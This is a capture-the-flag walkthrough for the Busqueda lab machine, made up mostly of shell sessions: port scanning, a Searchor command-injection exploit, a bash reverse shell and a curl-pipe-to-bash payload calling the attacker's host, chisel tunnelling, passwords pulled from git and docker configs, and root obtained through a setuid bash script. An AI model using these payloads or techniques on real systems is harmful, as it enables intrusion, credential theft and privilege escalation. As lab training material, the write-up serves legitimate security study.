---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Busqueda





```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.208 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 05:37 CET
Initiating SYN Stealth Scan at 05:37
Scanning 10.10.11.208 [65535 ports]
Discovered open port 22/tcp on 10.10.11.208
Discovered open port 80/tcp on 10.10.11.208
Completed SYN Stealth Scan at 05:37, 12.14s elapsed (65535 total ports)
Nmap scan report for 10.10.11.208
Host is up, received user-set (0.054s latency).
Scanned at 2025-02-13 05:37:35 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65541 (2.622MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.208
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80 10.10.11.208 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 05:38 CET
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   59.87 ms 10.10.16.1
2   29.86 ms searcher.htb (10.10.11.208)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep searcher
10.10.11.208 searcher.htb
```



```bash
❯ whatweb http://searcher.htb
http://searcher.htb [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```



```bash
❯ curl -I http://searcher.htb
HTTP/1.1 200 OK
Date: Thu, 13 Feb 2025 04:46:42 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 13519
```



```bash
❯ feroxbuster -u http://searcher.htb
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://searcher.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://searcher.htb/search
200      GET      430l      751w    13519c http://searcher.htb/
403      GET        9l       28w      277c http://searcher.htb/server-status
[######>-------------] - 23s     9761/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9771/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9772/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9792/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9817/30002   49s     found:3       errors:7      
[######>-------------] - 23s     9824/30002   49s     found:3       errors:7      
[####################] - 81s    30002/30002   0s      found:3       errors:36     
[####################] - 81s    30001/30001   371/s   http://searcher.htb/  
```



<figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (2) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (3) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (4) (1).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection" %}



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
❯ ./exploit.sh searcher.htb 10.10.16.7 443
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.16.7:443
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.208] 37882
bash: cannot set terminal process group (1646): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 
```





```bash
' + __import__('os').popen('id').read() + '
```

<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>



```bash
❯ catnp shell.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1'

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```





```bash
' + __import__('os').popen('curl http://10.10.16.7/shell.sh|bash').read() + '
```

<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.208] 46348
bash: cannot set terminal process group (1646): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ cat /home/svc/user.txt 
26d7ad943e8f5b32d536c741caf5572f
```



```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
sudo: a password is required
svc@busqueda:/var/www/app/.git$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```



```bash
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Feb 13 04:37 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
svc@busqueda:/var/www/app$ cd .git/
svc@busqueda:/var/www/app/.git$ ls -la
total 52
drwxr-xr-x 8 www-data www-data 4096 Feb 13 04:37 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
-rw-r--r-- 1 root     root      259 Apr  3  2023 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```



```bash
svc@busqueda:~$ ls -la
total 36
drwxr-x--- 4 svc  svc  4096 Apr  3  2023 .
drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28  2023 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3  2023 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3  2023 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20  2023 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Feb 13 04:37 user.txt
svc@busqueda:~$ cat .gitconfig 
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks
```



```bash
svc@busqueda:/var/www/app/.git$ netstat -ano | grep LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:36977         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
```



```bash
svc@busqueda:/var/www/app/.git$ curl 127.0.0.1:3000
<!DOCTYPE html>
<html lang="en-US" class="theme-auto">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Gitea: Git with a cup of tea</title>
	<link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdlL3BuZyIsInNpemVzIjoiNTEyeDUxMiJ9LHsic3JjIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19">
	<meta name="theme-color" content="#6cc644">
	<meta name="default-theme" content="auto">
	<meta name="author" content="Gitea - Git with a cup of tea">
	<meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
	<meta name="keywords" content="go,git,self-hosted,gitea">
	<meta name="referrer" content="no-referrer">
```



```bash
❯ ls -l chisel
.rwxrwxr-x kali kali 8.9 MB Thu Feb 13 06:27:17 2025  chisel

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
svc@busqueda:/tmp$ wget 10.10.16.7/chisel
--2025-02-13 05:28:28--  http://10.10.16.7/chisel
Connecting to 10.10.16.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9371800 (8.9M) [application/octet-stream]
Saving to: ‘chisel’

chisel              100%[===================>]   8.94M  14.4MB/s    in 0.6s    

2025-02-13 05:28:29 (14.4 MB/s) - ‘chisel’ saved [9371800/9371800]

svc@busqueda:/tmp$ chmod +x chisel 
```



```bash
❯ ./chisel server --reverse -p 1234
2025/02/13 06:28:08 server: Reverse tunnelling enabled
2025/02/13 06:28:08 server: Fingerprint xFMTGHlQJdJsHHdW3CIYK8LVKjgF03JbfqsK8OAo85A=
2025/02/13 06:28:08 server: Listening on http://0.0.0.0:1234
```



```bash
svc@busqueda:/tmp$ ./chisel client 10.10.16.7:1234 R:80:127.0.0.1:3000
2025/02/13 05:36:41 client: Connecting to ws://10.10.16.7:1234
2025/02/13 05:36:42 client: Connected (Latency 33.301115ms)
```



```bash
❯ catnp /etc/hosts | grep searcher
127.0.0.1	localhost kali gitea.searcher.htb
```



<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>



```bash
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```



```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py
Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as root on busqueda.

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py a
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```



```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```



```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect f84a6b33fb5a
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```



{% embed url="https://docs.docker.com/reference/cli/docker/inspect/" %}



```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
{
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
  "State": {
    "Status": "running",
    "Running": true,
    "Paused": false,
    "Restarting": false,
    "OOMKilled": false,
    "Dead": false,
    "Pid": 1813,
    "ExitCode": 0,
    "Error": "",
    "StartedAt": "2025-02-13T04:37:25.273234426Z",
    "FinishedAt": "2023-04-04T17:03:01.71746837Z"
  },
  
...[snip]---

    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
```



```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' 960873171e2e | jq .
{
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
      "MYSQL_USER=gitea",
      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
      "MYSQL_DATABASE=gitea",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "GOSU_VERSION=1.14",
      "MYSQL_MAJOR=8.0",
      "MYSQL_VERSION=8.0.31-1.el8",
      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
    ],
    "Cmd": 
        "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
        "EndpointID": "65b29932ec694c85766bacba4fdbe26c12de8d00af399737b1c5389a7bdc7a76",
        "Gateway": "172.19.0.1",
        "IPAddress": "172.19.0.3",
        "IPPrefixLen": 16,
        "IPv6Gateway": "",
        "GlobalIPv6Address": "",
        "GlobalIPv6PrefixLen": 0,
        "MacAddress": "02:42:ac:13:00:03",
        "DriverOpts": null
      }
    }
  }
}
```





```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```



```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "65b29932ec694c85766bacba4fdbe26c12de8d00af399737b1c5389a7bdc7a76",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
```



```bash
svc@busqueda:~$ ifconfig docker0
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:2c:0d:9b:c6  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

svc@busqueda:~$ ping -c 1 172.19.0.3
PING 172.19.0.2 (172.19.0.3) 56(84) bytes of data.
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.051 ms

--- 172.19.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms
```





```bash
svc@busqueda:~$ mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 225
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW TABLES;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| app_state                 |
| attachment                |
| badge                     |
| collaboration             |
| comment                   |
| commit_status             |
| commit_status_index       |
| deleted_branch            |
| deploy_key                |
| email_address             |
| email_hash                |
| external_login_user       |
| follow                    |
| foreign_reference         |
| gpg_key                   |
| gpg_key_import            |
| hook_task                 |
| issue                     |
| issue_assignees           |
| issue_content_history     |
| issue_dependency          |
| issue_index               |
| issue_label               |
| issue_user                |
| issue_watch               |
| label                     |
| language_stat             |
| lfs_lock                  |
| lfs_meta_object           |
| login_source              |
| milestone                 |
| mirror                    |
| notice                    |
| notification              |
| oauth2_application        |
| oauth2_authorization_code |
| oauth2_grant              |
| org_user                  |
| package                   |
| package_blob              |
| package_blob_upload       |
| package_file              |
| package_property          |
| package_version           |
| project                   |
| project_board             |
| project_issue             |
| protected_branch          |
| protected_tag             |
| public_key                |
| pull_auto_merge           |
| pull_request              |
| push_mirror               |
| reaction                  |
| release                   |
| renamed_branch            |
| repo_archiver             |
| repo_indexer_status       |
| repo_redirect             |
| repo_topic                |
| repo_transfer             |
| repo_unit                 |
| repository                |
| review                    |
| review_state              |
| session                   |
| star                      |
| stopwatch                 |
| system_setting            |
| task                      |
| team                      |
| team_invite               |
| team_repo                 |
| team_unit                 |
| team_user                 |
| topic                     |
| tracked_time              |
| two_factor                |
| upload                    |
| user                      |
| user_badge                |
| user_open_id              |
| user_redirect             |
| user_setting              |
| version                   |
| watch                     |
| webauthn_credential       |
| webhook                   |
+---------------------------+
91 rows in set (0.01 sec)
```



```bash
mysql> SELECT * FROM user;
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
| id | lower_name    | name          | full_name | email                            | keep_email_private | email_notifications_preference | passwd                                                                                               | passwd_hash_algo | must_change_password | login_type | login_source | login_name | type | location | website | rands                            | salt                             | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login | avatar | avatar_email                     | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style | theme | keep_activity_private |
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
|  1 | administrator | administrator |           | administrator@gitea.searcher.htb |                  0 | enabled                        | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | 44748ed806accc9d96bf9f495979b742 | a378d3f64143b284f104c926b8b49dfb | en-US    |             |   1672857920 |   1680531979 |      1673083022 |                    1 |                -1 |         1 |        1 |             0 |              0 |                  0 |                         1 |              0 |        | administrator@gitea.searcher.htb |                 0 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | auto  |                     0 |
|  2 | cody          | cody          |           | cody@gitea.searcher.htb          |                  0 | enabled                        | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | 304b5a2ce88b6d989ea5fae74cc6b3f3 | d1db0a75a18e50de754be2aafcad5533 | en-US    |             |   1672858006 |   1680532283 |      1680532243 |                    1 |                -1 |         1 |        0 |             0 |              0 |                  0 |                         1 |              0 |        | cody@gitea.searcher.htb          |                 0 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | auto  |                     0 |
+----+---------------+---------------+-----------+----------------------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------+----------------------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
2 rows in set (0.00 sec)
```



<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>



```bash
svc@busqueda:/tmp$ ls -l full-checkup.sh 
-rwxr-xr-x 1 svc svc 33 Feb 13 06:07 full-checkup.sh
svc@busqueda:/tmp$ cat full-checkup.sh 
#!/bin/bash

chmod u+s /bin/bash
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@busqueda:/tmp$ bash -p
bash-5.1$ whoami
root
bash-5.1$ cat /root/root.txt 
219cc898cfb210bbb3bf2c0390d1e6ec
```
